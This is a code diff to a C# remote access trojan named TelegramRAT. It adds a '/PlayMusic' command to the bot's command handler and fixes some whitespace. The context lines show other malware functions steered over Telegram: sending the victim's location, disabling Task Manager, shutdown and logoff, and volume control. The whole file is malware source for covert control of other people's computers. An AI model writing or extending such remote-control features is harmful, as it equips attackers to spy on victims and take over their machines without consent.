@@ -125,6 +125,7 @@ namespace TelegramRAT
                             "\n /Uninstall" +
                             "\n" +
                             "\n🔊 AUDIO: " +
+                            "\n /PlayMusic <file>" +
                             "\n /AudioVolumeSet <0-100>" +
                             "\n /AudioVolumeGet" +
                             "\n" +
@@ -236,7 +237,7 @@ namespace TelegramRAT
 
                             lat = data["lat"];
                             lon = data["lon"];
-                            if(data.HasKey("range"))
+                            if (data.HasKey("range"))
                                 range = data["range"];
 
                             telegram.sendLocation(lat, lon);
@@ -561,8 +562,8 @@ namespace TelegramRAT
                             telegram.sendText("⛔ Something was wrong while disabling taskmanager");
                             break;
                         }
-                    telegram.sendText("❎ Taskmanager disabled");
-                    break;
+                        telegram.sendText("❎ Taskmanager disabled");
+                        break;
                     }
                 // MinimizeAllWindows
                 case "MINIMIZEALLWINDOWS":
@@ -1223,7 +1224,7 @@ namespace TelegramRAT
                         break;
                     }
 
-                    
+
                 // Shutdown
                 case "SHUTDOWN":
                     {
@@ -1256,7 +1257,31 @@ namespace TelegramRAT
                         utils.PowerCommand("/l");
                         break;
                     }
-
+                // PlayMusic
+                case "PLAYMUSIC":
+                    {
+                        // Check if args exists
+                        string path;
+                        try
+                        {
+                            path = args[1];
+                        }
+                        catch (IndexOutOfRangeException)
+                        {
+                            telegram.sendText("⛔ Argument <file> is required for /PlayMusic");
+                            break;
+                        }
+                        // If file not exists
+                        if (!File.Exists(path))
+                        {
+                            telegram.sendText(string.Format("⛔ File \"{0}\" not found!", Path.GetFileName(path)));
+                            break;
+                        }
+                        // Play
+                        utils.PlayMusic(path);
+                        
+                        break;
+                    }
                 // AudioVolumeSet
                 case "AUDIOVOLUMESET":
                     {
